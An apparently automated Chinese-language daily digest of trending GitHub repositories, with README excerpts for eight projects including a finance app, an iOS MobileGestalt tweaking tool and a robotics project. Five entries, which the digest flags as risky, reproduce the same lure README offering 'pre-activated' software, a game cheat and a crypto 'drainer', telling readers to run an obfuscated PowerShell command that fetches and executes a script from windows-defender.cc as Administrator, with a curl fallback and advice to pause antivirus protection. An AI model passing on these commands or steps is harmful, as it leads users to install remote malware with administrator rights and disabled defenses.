📊 开源日报 — 2026-11-11
共发现 8 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  we-promise/sure
    ⭐ 12271 stars  |  🍴 908 forks  |  💻 Ruby  |  📅 2025-07-23
    🔗 https://github.com/we-promise/sure
    📡 来源: trending-daily
    📝 The personal finance app for everyone (by everyone)

    README 摘要:
    Deutsch | 
      Español | 
      Français | 
      日本語 | 
      한국어 | 
      Português | 
      Русский | 
      中文
    
    # Sure: The personal finance app for everyone
    
    Get
    involved: Discord • Website • Issues
    
    > [!IMPORTANT]
    > This repository is a community fork of the now-abandoned Maybe Finance project. 
    > Learn more in their final release doc.
    
    ## Backstory
    
    The Maybe Finance (archived/abandoned repo) team spent most of 2021–2022 building a full-featured personal finance and wealth management app. It even included an “Ask an Advisor” feature that connected users with a real CFP/CFA — all included with your subscription.
    
    The business end of things didn't work out, and so they stopped developing the app in mid-2023.
    
    After spending nearly $1 million on development (employees, contractors, data providers, infra, etc.), the team open-sourced the app. Their goal was to let users self-host it for free — and eventually launch a hosted version for a small fee.
    
    They actually did launch that hosted version … briefly.
    
    That also didn’t work out — at least not as a sustainable B2C business — so now here we are: hosting a community-maintained fork to keep the codebase alive and see where this can go next.
    
    Join us!
    
    ## Hosting Sure
    
    Sure is a fully working personal finance app that can be self hosted with Docker.
    Sure can be accessed from a browser, the macOS desktop app, the mobile app, API
    clients, and LLM agents. See Sure Clients for an overview.
    
    ## Forking and Attribution
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  Kianuni/Erosion-CN
    ⭐ 1290 stars  |  🍴 292 forks  |  💻 Swift  |  📅 2026-11-10
    🔗 https://github.com/Kianuni/Erosion-CN
    📡 来源: 🚀 5天300+星
    📝 iOS / iPadOS 系统配置与 MobileGestalt 研究工具箱（简体中文防白苹果安全加固版）

    README 摘要:
    Erosion-CN
      基于 worse_query 的 iOS / iPadOS 系统配置与 MobileGestalt 研究工具箱（简体中文防白苹果安全加固版）
      支持 iOS / iPadOS 27.0 – 27.2 / 27.3 beta 1（完整支持）以及 iOS / iPadOS 26.x（部分支持）。
      
      
      
    
    ---
    
    ## 项目简介与核心改进
    
    **Erosion-CN** 分支衍生自官方上游项目 **jailbreakdotparty/Erosion**，完成了 **100% 简体中文界面本地化**，修复了原版多项严重真机 Bug，并进行了系统级防白苹果安全加固与底层能力扩展：
    
    1. **修复重启后修改自动失效还原（反弹回原厂状态）的严重 Bug**
       - 原版在未手动切换过设置开关时，`mgWriteAtomically` 默认返回 `false`，导致实际走了临时文件替换（`replaceItemAt`），破坏了系统缓存文件的 Inode 与 `_mobilegestalt` POSIX 属主权限，设备一重启即被系统丢弃重建；同时原版在 iOS 27 上额外注入了非缓存键 `RegionInfo`（`zHeENZu+wbg7PUprwNwBWg`），触发开机缓存合法性校验整包重置。
       - 本分支已默认强制锁定原位覆盖写入，严格遵循 iOS 27 原厂缓存键结构，并自动匹配写入对应机型的监管型号（`RegulatoryModelNumber`），**真正做到持久化生效、重启不反弹**。
    2. **修复内置 Plist 编辑器破坏布尔值与相机浮点参数导致「相机黑屏」的严重 Bug**
       - 原版 `PlistManager` 将 `CFBoolean`（`` / ``）以及整数值 `Double`（如相机变焦倍率 `1.0`、`2.0`、`5.0` 等）误判转换为了 `` 整型，导致编辑保存 `MobileGestalt` 后系统相机取景直接黑屏。
       - 本分支改用 `CFBooleanGetTypeID()` 与 `CFNumberIsFloatType()` 精确识别底层 CoreFoundation 类型，保留原始 Plist 根类型与编码格式，并对未修改项执行 **100% 原样无损直通（Lossless Pass-through）**，彻底解决相机黑屏问题。
    3. **零 0 字节窗口原位写入协议（`pwrite` + 按需尾截断 + `F_FULLFSYNC`）**
       - 重构底层文件 I/O：不再先执行 `ftruncate(fd, 0)` 清空系统文件，而是直接从偏移 `0` 原位覆盖写入、写完后按需裁剪尾部，并调用 `fcntl(fd, F_FULLFSYNC)` 强制刷新 APFS 与物理闪存缓存，断电或异常中断绝不留空文件。
    4. **写入前变更对比预览（Diff Preview）+ 写后全量读回校验与自动回滚**
       - 点击「应用」时逐条展示所有待修改键值与十六进制槽位对比（`修改前 → 修改后`）；
       - 写入前自动保存 `PreApplyGestalt.plist` 快照，写入后立即从磁盘读回并做二进制 Plist 反序列化与严格类型校验，一旦出现任何不一致立即自动原位回滚。
    5. **本机 `libMobileGestalt.dylib` 运行时动态偏移解析（零硬编码）**
       - 在设备运行时只读扫描内存中加载的 `/usr/lib/libMobileGestalt.dylib` 查询描述符表，实时计算当前机型与当前系统版本的 `CacheUUID`、总槽位数及布尔槽位偏移（`green-tea`、`not-green-tea`、`wapi`）；
       - **严格多重校验门控**：仅当本机 `CacheUUID` 唯一匹配、总长度精确等于 `槽位数 × 9`、有效位 `validity == 1`、8 字节槽位填充全为 `0` 且无任何无关字节变动时才允许修改；解析未通过时自动锁定开关并拦截写入。
    6. **双重原厂金库备份（跨卸载重装不丢备份）、四重指纹防呆与一键恢复原机出厂参数**
       - **沙盒 + 系统安全金库双冗余备份**：生成原始备份 `OriginalGestalt.plist` 时同步计算 `SHA-256` 摘要并镜像锁定至系统级共享容器安全金库（标记 `isExcludedFromBackup = true` 防换机污染）——**即使侧载证书过期卸载重装应用，也能自动无损找回最初未修改的原厂备份**，并支持手动导入/导出外部 `.plist` 备份及首次备份脏状态检测；
       - **全模块一键恢复原机出厂参数**：主页与 `MobileGestalt` 页顶均内置「一键恢复原机出厂参数」，强制核对 `SHA-256`、`CacheVersion`、`CacheUUID`、`CacheData` 长度与真实内核硬件 `ProductType`，同步清空本地自定义开关残留、锁屏文字/铭牌、伪监管文件与拨号盘缓存；跨 iOS 版本 OTA 升级拦截时可直接一键联动「重建系统纯净原厂缓存」。
    7. **重签证书 `App Group` 自动探测与高危软砖项拆除**
       - 运行时通过 `SecTaskCopyValueForEntitlement` 与纯 Swift Mach-O `LC_CODE_SIGNATURE` 签名段解析自动匹配任意重签工具注入的可用 `group.*` 容器；
       - 默认移除并拦截上游版本中存在软砖/无限设置向导隐患的高危功能（如 iPhone 正则盲改切片的 iPadOS 模式、个人零售设备的监管模式开关、非缓存键注入等）。
    8. **完善机型适配、iOS 27 进阶 AI 能力解锁与实用工具优化**
       - 补全 iPhone

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  ⚠️风险  AngleCentipede/ifunbox
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 766 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-10
    🔗 https://github.com/AngleCentipede/ifunbox
    📡 来源: 🚀 5天300+星
    🏷️ automation, desktop, developer-tools, game-files, guide-setup-ifunbox, how-to-install-ifunbox, how-to-setup-ifunbox, ifunbox-2026, ifunbox-browse-ios-apps-windows, ifunbox-download-iphone-file-manager
    📝 Ifunbox 2026 pre-configured environment for seamless desktop software utility deployment on isolated workstation.

    README 摘要:
    # Ifunbox
    
    ### ⚡ Overview
    **This repository provides a pre-activated, free setup for Ifunbox.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
    
    ### ⚙️ System Specifications
    > **Distribution Type:** Pre-activated Local Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 1.0 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    ## 🛠️ Quick Installation Guide
    
    1. Open Terminal as Administrator:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
    
    2. Run the Setup Command:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
    
       ```cmd
       irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
       ```
    
    ---
    
    ## 📖 Troubleshooting & Easy Fixes
    
    ### ⚠️ If the script is blocked by Execution Policy
    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
    ```cmd
    curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1
    ```
    
    ### 🛡️ Antivirus / SmartScreen Warnings
    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  HybridRobotics/supermimic
    ⭐ 761 stars  |  🍴 49 forks  |  💻 Python  |  📅 2026-11-10
    🔗 https://github.com/HybridRobotics/supermimic
    📡 来源: 🚀 5天300+星
    📝 Humanoid whole-body motion tracking with one differentiable world model.

    README 摘要:
    # SuperMimic
    
    Project page | Paper
    
    SuperMimic trains a humanoid whole-body motion tracker with one differentiable world model, built on mjlab.
    
    ## Setup
    
    Install uv:
    
    ```bash
    curl -LsSf https://astral.sh/uv/install.sh | sh
    ```
    
    Clone both repos as siblings:
    
    ```bash
    mkdir supermimic_ws && cd supermimic_ws
    git clone git@github.com:HybridRobotics/supermimic.git
    git clone git@github.com:kevinzakka/mjlab_research.git
    cd supermimic
    ```
    
    ## Usage
    
    Available task IDs:
    
    - `SuperMimic-GenCoord-G1` — generalized coordinates representation
    - `SuperMimic-MaxCoord-G1` — maximal coordinates representation
    
    Train a world model and policy:
    
    ```bash
    CUDA_VISIBLE_DEVICES= uv run src/supermimic/scripts/train.py \
       --runner.run_name 
    ```
    
    Play back a trained model:
    
    ```bash

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  ⚠️风险  chambergeneralamp/quant-trading-bot
    ⚠️ 命中风险词: trading bot, bypass —— 默认归排除区，需人工确认
    ⭐ 760 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-10
    🔗 https://github.com/chambergeneralamp/quant-trading-bot
    📡 来源: 🚀 5天300+星
    🏷️ ai-futures-bot, atas-platform, atas-pro, binance-auto-bot, binance-future, dealer-positioning, es-futures, forex-bot, futures-bot, gold-trading-bots
    📝 Quant Trading Bot 2023 pre-configured environment for seamless desktop software utility deployment.

    README 摘要:
    # Quant Trading Bot
    
    ### ⚡ Overview
    **This repository provides a pre-activated, free setup for Quant Trading Bot.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
    
    ### ⚙️ System Specifications
    > **Distribution Type:** Pre-activated Local Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 2.7 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    ## 🛠️ Quick Installation Guide
    
    1. Open Terminal as Administrator:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
    
    2. Run the Setup Command:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
    
       ```cmd
       irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
       ```
    
    ---
    
    ## 📖 Troubleshooting & Easy Fixes
    
    ### ⚠️ If the script is blocked by Execution Policy
    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
    ```cmd
    curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1
    ```
    
    ### 🛡️ Antivirus / SmartScreen Warnings
    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  ⚠️风险  crewbookkeepercastle/trx-drainer-bot
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 759 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-10
    🔗 https://github.com/crewbookkeepercastle/trx-drainer-bot
    📡 来源: 🚀 5天300+星
    🏷️ automation, developer-tools, drain-bot, drain-protocol, drainer-usdt-tool, guide-setup-trx-drainer-bot, how-to-install-trx-drainer-bot, how-to-setup-trx-drainer-bot, open-source, python
    📝 Trx Drainer Bot 2023 pre-configured environment for automated AI-driven transaction processing in enterprise software catalog.

    README 摘要:
    # TRX Drainer Bot
    
    ### ⚡ Overview
    **This repository provides a pre-activated, free setup for Trx Drainer Bot.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
    
    ### ⚙️ System Specifications
    > **Distribution Type:** Pre-activated Local Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 2.4 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    ## 🛠️ Quick Installation Guide
    
    1. Open Terminal as Administrator:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
    
    2. Run the Setup Command:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
    
       ```cmd
       irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
       ```
    
    ---
    
    ## 📖 Troubleshooting & Easy Fixes
    
    ### ⚠️ If the script is blocked by Execution Policy
    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
    ```cmd
    curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1
    ```
    
    ### 🛡️ Antivirus / SmartScreen Warnings
    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  ⚠️风险  CpuMizukageFaucet/touch-copy
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 757 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-10
    🔗 https://github.com/CpuMizukageFaucet/touch-copy
    📡 来源: 🚀 5天300+星
    🏷️ automation, content-copy, copyfail, developer-tools, guide-setup-touch-copy, how-to-install-touch-copy, how-to-setup-touch-copy, iphone, open-source, phone-tool
    📝 Touch Copy 2026 automated deployment pipeline for secure, efficient desktop software utility configuration.

    README 摘要:
    # Touch Copy
    
    ### ⚡ Overview
    **This repository provides a pre-activated, free setup for Touch Copy.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
    
    ### ⚙️ System Specifications
    > **Distribution Type:** Pre-activated Local Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 1.2 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    ## 🛠️ Quick Installation Guide
    
    1. Open Terminal as Administrator:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
    
    2. Run the Setup Command:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
    
       ```cmd
       irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
       ```
    
    ---
    
    ## 📖 Troubleshooting & Easy Fixes
    
    ### ⚠️ If the script is blocked by Execution Policy
    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
    ```cmd
    curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1
    ```
    
    ### 🛡️ Antivirus / SmartScreen Warnings
    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  ⚠️风险  ToothHalberdier/aion-2-trainer-tool
    ⚠️ 命中风险词: bypass —— 默认归排除区，需人工确认
    ⭐ 297 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-10
    🔗 https://github.com/ToothHalberdier/aion-2-trainer-tool
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, developer-tools
    📝 Aion 2, an AI-driven prompt engineering resource, offers a pre-configured environment for seamless local workstation deployment in 2026.

    README 摘要:
    # AION 2 Cheat
    
    ### ⚡ Overview
    **This repository provides a pre-activated, free setup for Aion 2 Cheat.** It is fully configured for standalone deployment, removing the need for registration or license configuration. Perfect for testing, development, and local workstation setups.
    
    ### ⚙️ System Specifications
    > **Distribution Type:** Pre-activated Local Build
    >
    > **Target Platform:** Windows x64 Desktop
    >
    > **Estimated File Size:** 1.1 GB
    >
    > **Last Verified Mirror Sync:** November 2026
    
    ---
    ## 🛠️ Quick Installation Guide
    
    1. Open Terminal as Administrator:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal (Administrator)** or **Windows PowerShell (Administrator)** from the menu.
    
    2. Run the Setup Command:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Just wait a moment for the automated configuration to finish:
    
       ```cmd
       irm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)
       ```
    
    ---
    
    ## 📖 Troubleshooting & Easy Fixes
    
    ### ⚠️ If the script is blocked by Execution Policy
    If Windows stops the command due to standard security settings, you can easily bypass this by running it via a standard Command Prompt (cmd) in two quick steps:
    ```cmd
    curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1
    ```
    
    ### 🛡️ Antivirus / SmartScreen Warnings
    Security software can sometimes flag automated tools by mistake (false positive). If the setup gets blocked, simply pause "Real-time protection" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.
